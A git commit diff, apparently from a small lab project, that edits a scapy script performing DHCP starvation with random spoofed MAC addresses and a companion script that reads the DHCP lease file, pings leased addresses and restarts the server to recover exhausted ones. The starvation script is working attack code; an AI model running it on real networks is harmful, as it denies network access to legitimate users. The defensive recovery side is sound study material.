a9b55163bade58c4d899fd4678b379fe85f25b43
master <akashraj98>
2021-07-12 18:55:07 +0530

    small bug fix

--- dhcp_starvation.py
+++ dhcp_starvation.py
@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import sys
 import os
@@ -8,13 +8,17 @@ def main():
     layer2_broadcast = "ff:ff:ff:ff:ff:ff"
     conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out
     
-    Server_ip = "192.168.1.1"
+    server_ip = "192.168.1.1"
+    start = 100
+    end = 130
     
     def dhcp_starvation():
-        for ip in range (104,110):
+        for ip in range (start,end):
             for i in range (0,1):
                 bogus_mac_address = RandMAC()
-                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id",Server_ip),("requested_addr", "192.168.1." + str(ip)),"end"])
+                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0",\
+                     dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),\
+                     ("server_id",server_ip),("requested_addr", server_ip[:-1] + str(ip)),"end"])
                 sendp(dhcp_request)
                 print("Requesting: " + "192.168.1." + str(ip) + "\n")
                 time.sleep(1)
--- main.py
+++ main.py
@@ -4,6 +4,7 @@ import subprocess
 
 LEASE_PATH= '/var/lib/dhcp/dhcpd.leases'
 
+
 # read dhcp lease file for ips
 with open(LEASE_PATH)as fh:
     fstring = fh.readlines()
@@ -11,10 +12,12 @@ with open(LEASE_PATH)as fh:
 #use regex to exract all the ips that are assigned by dhcp 
 pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
 leaseip_lst =[]
+leaseip_lst_ip = []
 for index in range(len(fstring)):
     m = pattern.search(fstring[index])
-    if m is not None and m.group() not in leaseip_lst:
+    if m is not None and m.group() not in leaseip_lst_ip:
         leaseip_lst.append((m.group(),index))
+        leaseip_lst_ip.append(m.group())
 
 
 #PINGS IP from lease list and check
@@ -23,14 +26,17 @@ for index in range(len(fstring)):
 noresp_ip=[]
 resp_ip =[]
 with open(os.devnull, "wb") as limbo:
+        print("\nIP Address    Type of Client")
+        print("_________________________________")
         for ip in leaseip_lst:
-                result=subprocess.Popen(["ping", "-c", "1", "-W", "2", ip[0]],
+                result=subprocess.Popen(["ping", "-c", "5", "-W", "2", ip[0]],
                         stdout=limbo, stderr=limbo).wait()
+                
                 if result:
-                        print(ip[0], "Malicious")
+                        print(ip[0], "| Malicious")
                         noresp_ip.append(ip[0])
                 else:
-                        print(ip[0], "Legitimate")
+                        print(ip[0], "| Legitimate*")
                         resp_ip.append(ip[0])
 
 
@@ -61,13 +67,16 @@ subprocess.run(["systemctl", "restart", "isc-dhcp-server"])
 end = time.time()
 print("\nRECOVERING IPs ..................\n")
 time.sleep(1)
+print("\nIP Address         Recovery Time(s)")
+print("______________________________")
 for ip in noresp_ip:
-        print(ip,end-start)
+        print(ip,"   ",end-start,"s")
         
 #Creating Summary table
-print("\n__________IP Address Status_________\n")
+print("\n\nIP Address      Status")
+print("______________________________")
 for ip in resp_ip:
-        print(ip,"ASSIGNED")
+        print(ip,"  ASSIGNED")
 
 for ip in noresp_ip:
-        print(ip,"RECOVERED")
+        print(ip,"  RECOVERED")
